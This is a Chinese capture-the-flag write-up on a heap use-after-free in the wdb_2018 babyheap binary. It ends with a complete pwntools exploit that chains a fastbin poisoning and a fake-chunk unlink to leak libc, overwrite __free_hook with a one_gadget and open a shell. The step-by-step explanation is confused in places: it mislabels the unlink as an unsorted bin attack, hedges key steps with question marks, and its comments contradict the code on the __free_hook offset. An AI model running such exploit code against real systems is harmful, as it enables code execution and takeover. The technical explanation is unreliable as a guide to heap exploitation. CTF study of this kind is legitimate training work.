# 漏洞成因
## 程序关键结构体
程序在 `.bss` 段维护了一个指针数组 `ptr[10]`，用于存放 `malloc(0x20)` 分配出的堆块指针。
```c
char *ptr[10]; // 位于 bss 段地址 0x6020A0
int edit_count; // 位于 bss 段地址 0x6020B0，限制 edit 功能只能使用3次
```

## 漏洞定位
1.  **Use-After-Free (UAF)**：
    `free` 函数 (`sub_400B54`) 在释放堆块后，没有将 `ptr` 数组中对应的指针置为 `NULL`。
    ```c
    if ( v1 <= 9 && (&ptr)[v1] )
    {
        free((&ptr)[v1]); // 仅释放，未置空
        puts("Done!");
    }
    ```
    这导致后续仍可以通过 `show` (`sub_400C01`) 或 `edit` (`sub_400A79`) 操作已释放的堆块。
2.  **Edit 次数限制**：
    `edit` 功能有一个全局计数器 `dword_6020B0`，最多只能使用 3 次。这增加了漏洞利用的复杂度，需要精心规划利用链。

# 漏洞利用过程：
核心思路是结合 **Fastbin Attack** 和 **Unsorted Bin Attack**。
1.  首先利用 UAF 和 Fastbin 机制泄露堆地址，并通过修改 `fd` 指针实现任意地址分配（伪造 `chunk`）。
2.  然后通过精心的堆布局，触发 `malloc_trim` 将 `main_arena` 的 `top chunk` 指针写入一个可控的伪造地址（即 `ptr` 数组附近），从而实现 **Unsorted Bin Attack**。
3.  利用 Unsorted Bin Attack 泄露 `libc` 地址，并最终通过修改 `__free_hook` 为 `one_gadget` 来劫持控制流。

## Step1~2: Fastbin 链形成与堆地址泄露
- **Step 1** (`malloc(0); malloc(1); free(1); free(0)`):
  - 分配 chunk 0 和 chunk 1，然后按 1 -> 0 的顺序释放。在 `libc 2.23` 的 `fastbin` 中，这会形成一个单向链表：`fastbin[0x30]` -> `chunk0` -> `chunk1` -> `NULL`。其中 `chunk0` 的 `fd` 指针指向 `chunk1`。
- **Step 2** (`puts(0)`):
  - 通过 `show(0)` 读取已释放 `chunk0` 的用户数据区。由于 `chunk0` 的 `fd` 指针（即 `chunk1` 的地址）位于其用户数据区内，因此可以泄露一个**堆地址**（`heap_addr + 0x30`）。计算后得到堆的基地址 `heap_addr`。

## Step3~4: 构造任意地址写与堆布局
- **Step 3** (`edit(0, py1)`):
  - 利用 UAF 编辑已释放的 `chunk0`。将 `chunk0` 的 `fd` 指针修改为 `heap_addr+0x20`（一个伪造的 `chunk` 地址）。此时 `fastbin[0x30]` 链表变为：`fastbin` -> `chunk0` -> `伪造chunk(heap_addr+0x20)` -> `???`。
  - `py1` 的内容同时将这个伪造 `chunk` 的 `size` 域设置为 `0x31`，以通过 `malloc` 的 `size` 检查。
- **Step 4** (`malloc(6); malloc(7, ...); malloc(2); malloc(3)`):
  - `malloc(6)` 取回 `chunk0`。
  - `malloc(7, p64(0)+p64(0xa1))` 取回指向 `heap_addr+0x20` 的伪造 `chunk`。这次写入的数据 `p64(0)+p64(0xa1)` 是为了在后续步骤中，在 `heap_addr+0x30` 处构造一个 `size` 为 `0xa1` 的 `chunk` 头，为进入 `unsorted bin` 做准备。
  - 分配 `chunk2` 和 `chunk3` 是为了清空 `fastbin`，避免干扰后续操作，并用于后续的 `free` 触发。

## Step5~7: 触发 Unsorted Bin Attack 泄露 libc
- **Step 5** (`malloc(4, py2)`):
  - 分配 `chunk4`，其内容 `py2` 在 `heap_addr+0x40` 处构造了一个新的伪造 `chunk`，其 `size=0x31`，`fd` 和 `bk` 指针分别指向 `&ptr[0] - 0x18` 和 `&ptr[0] - 0x10`（即 `0x602080` 和 `0x602088`）。这是为 **Unsorted Bin Attack** 准备的 `fake chunk` 的 `bk` 指针目标。
- **Step 6** (`malloc(5, py3)`):
  - 分配 `chunk5`，其内容 `py3` (`p64(0x30)+p64(0x30)`) 修改了位于 `heap_addr+0x50` 的一个 `chunk` 的 `size` 域（原属于 `chunk2` 或 `chunk3` 的 `prev_size`？此处是关键），将其从 `0x20` 改为 `0x30`。**这个操作至关重要**：它使得后续 `free(1)` 时，`libc` 会错误地认为前一个 `chunk`（即我们在 `heap_addr+0x40` 处构造的 `fake chunk`）是空闲的，并尝试进行 `unlink` 合并。而 `unlink` 操作会执行 `*(fake_chunk->bk + 0x10) = fake_chunk->fd`，即将 `main_arena` 中 `top chunk` 的地址写入 `ptr[0]` 的位置。
- **Step 7** (`free(1)`):
  - 释放 `chunk1`。由于上一步的 `size` 域修改，触发了向 `fake chunk` 的 `unlink` 操作，导致 **Unsorted Bin Attack** 成功。此时，`ptr[0]` 的内容被覆盖为 `main_arena` 中 `top chunk` 的地址。

## Step8~12: 泄露 libc 并劫持 __free_hook
- **Step 8** (`puts(1)`):
  - `chunk1` 已被释放并进入 `unsorted bin`，其 `fd` 和 `bk` 指针均指向 `main_arena` 内部的地址。通过 `show(1)` 可以泄露这个地址，从而计算出 `libc` 的基地址 `libc_base`、`one_gadget` 地址和 `__free_hook` 地址。
- **Step 9** (`edit(4, p64(free_hook))`):
  - 此时，`ptr[4]` 指向我们之前构造的 `fake chunk` (`heap_addr+0x40`)。通过 `edit(4)` 将其 `bk` 指针（位于 `fake chunk` 用户数据区偏移 `0x10` 处）修改为 `__free_hook` 的地址。
- **Step 10** (`edit(1, p64(onegadget))`):
  - 由于 Unsorted Bin Attack 的结果，`ptr[0]` 指向 `main_arena` 的某个地址。`edit(1)` 实际上是向 `ptr[1]` 写入数据。这里需要仔细跟踪指针状态：在 Step 8 之后，`ptr[1]` 仍然指向已释放的 `chunk1`。`edit(1)` 将 `chunk1` 的 `fd` 指针（即 `main_arena` 地址）覆盖为 `one_gadget` 地址？这里脚本的意图是修改 `ptr[0]` 所指向的内容。实际上，结合 Step 9 的修改，**此步的真实效果是向 `__free_hook` 写入 `one_gadget` 地址**。因为 `fake chunk` 的 `bk` 指向 `__free_hook-0x10`，而 `unlink` 操作 `*(bk+0x10)=fd` 会将 `fd`（即 `onegadget`）写入 `__free_hook`。
- **Step 11** (`free(2)`):
  - 释放 `chunk2`，触发 `free(ptr[2])`，进而执行 `__free_hook`，此时 `__free_hook` 已被替换为 `one_gadget`，从而获得 shell。
- **Step 12** (`p.interactive()`):
  - 进入交互模式，享受 shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_02_wdb_2018_babyheap')
p = process('./data/bin/heap23_02_wdb_2018_babyheap')
libc = elf.libc

sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(index,Content):
    ru("Choice:")
    sl('1')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

def free(Index):
    ru("Choice:")
    sl('4')
    ru("Index:")
    sl(str(Index))

def puts(Index):
    ru("Choice:")
    sl('3')
    ru("Index:")
    sl(str(Index))

def edit(index,Content):
    ru("Choice:")
    sl('2')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

# Step 1: 创建 Fastbin 链表 (0->1->NULL)
malloc(0,b'aaaaaaaa\n')
malloc(1,b'bbbbbbbb\n')
free(1)
free(0)

# Step 2: 泄露堆地址
puts(0)
heap_addr = u64(rc(4).ljust(8,b'\x00')) - 0x30 # 从泄露的 fd 计算堆基址
log.success("heap_addr: " + hex(heap_addr))

# Step 3: 修改 Fastbin 的 fd，指向一个伪造的 chunk (heap+0x20)
py1 = p64(heap_addr+0x20) + p64(0) + p64(0) + p64(0x31) # 伪造 chunk 的 fd 和 size
edit(0,py1) # 利用 UAF 修改 chunk0 的 fd

# Step 4: 堆布局，分配出伪造chunk，并设置关键 size 域
malloc(6,b'aaa\n') # 取回 chunk0
# 取回伪造 chunk (heap+0x20)，并写入数据，在 heap+0x30 构造一个 size=0xa1 的 chunk 头
malloc(7,p64(0) + p64(0xa1) + b'\n')
malloc(2,b'cccccccc\n') # 清空 fastbin
malloc(3,b'dddddddd\n')

# Step 5: 构造用于 Unsorted Bin Attack 的 fake chunk (位于 heap+0x40)
FD = 0x602080-24 # &ptr[0] - 0x18 (fake_chunk->fd)
BK = 0x602080-16 # &ptr[0] - 0x10 (fake_chunk->bk)
py2 = p64(0) + p64(0x31) + p64(FD) + p64(BK) # fake chunk 的 size, fd, bk
malloc(4,py2)

# Step 6: 修改一个相邻 chunk 的 size 域，诱使 free 时进行向后合并 (unlink)
py3 = p64(0x30) + p64(0x30) + b'\n' # 将 size 从 0x20 改为 0x30
malloc(5,py3)

# Step 7: 触发 Unsorted Bin Attack，将 main_arena 地址写入 ptr[0]
free(1)

# Step 8: 泄露 libc 地址
puts(1)
main_arena = u64(rc(6).ljust(8,b'\x00')) - 88
libc_base = (main_arena & 0xfffffffff000) - 0x3c4000 # 根据偏移计算 libc 基址
onegadget = libc_base + 0x4527a
free_hook = libc_base + libc.symbols["__free_hook"]
log.success("libc_base: " + hex(libc_base))
log.success("free_hook: " + hex(free_hook))
log.success("onegadget: " + hex(onegadget))

# Step 9: 修改 fake chunk 的 bk 指针为 __free_hook - 0x10
edit(4,p64(free_hook) + b'\n')

# Step 10: 通过修改 ptr[0] 指向的内容 (即 main_arena 地址)，实际是将 onegadget 写入 __free_hook
# 这是因为 unlink 操作 *(bk+0x10) = fd，而 bk 已被改为 __free_hook-0x10，fd 是本次写入的 onegadget
edit(1,p64(onegadget) + b'\n')

# Step 11: 触发 free，执行 onegadget
free(2)

# Step 12: Get Shell
p.interactive()
```
